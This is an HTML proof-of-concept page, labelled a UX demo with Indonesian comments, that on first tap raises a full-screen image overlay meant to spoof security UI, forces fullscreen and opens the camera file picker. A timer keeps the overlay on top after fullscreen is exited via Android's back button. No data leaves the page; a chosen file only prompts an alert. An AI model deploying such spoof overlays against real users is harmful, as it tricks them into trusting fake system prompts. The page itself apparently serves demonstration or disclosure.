<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof (UX Demo)</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #111;
      color: #fff;
      font-family: sans-serif;
      height: 200vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      overflow-x: hidden;
    }

    #spoof {
      position: fixed;
      top: 100vh; /* awalnya turun */
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: block;
      z-index: 9999;
      pointer-events: none;
      transition: top 0.5s ease;
    }

    input[type=file] {
      display: none;
    }
  </style>
</head>
<body>

<img id="spoof" src="spof1.png" alt="UI overlay">
<div id="content">
  <h1>Tap anywhere to start demo</h1>
</div>

<input id="filePicker" type="file" accept="image/*" capture="environment">

<script>
const filePicker = document.getElementById('filePicker');
const spoof = document.getElementById('spoof');

document.addEventListener('click', async () => {
  // Naikkan overlay
  spoof.style.top = '0';
  document.getElementById('content').style.display = 'none';

  // Fullscreen
  if (document.documentElement.requestFullscreen) {
    try {
      await document.documentElement.requestFullscreen();
    } catch(e) {}
  }

  // Trigger file picker
  filePicker.click();
}, { once: true });

// Pastikan overlay tetap di atas ketika keluar fullscreen
function fixOverlay() {
  spoof.style.top = '0';
  spoof.style.height = window.innerHeight + 'px'; // paksa repaint
  window.scrollTo(0,0); // scroll ke atas
}

// Cek fullscreen secara berkala (untuk tombol back di Android)
setInterval(() => {
  if (!document.fullscreenElement) {
    fixOverlay();
  }
}, 100);

// Event fullscreenchange juga tetap dipakai
document.addEventListener('fullscreenchange', () => {
  if (!document.fullscreenElement) {
    fixOverlay();
  }
});

filePicker.addEventListener('change', (e) => {
  if (filePicker.files.length > 0) {
    console.log('File selected:', filePicker.files[0].name);
    alert('File selected: ' + filePicker.files[0].name);
  }
});
</script>

</body>
</html>
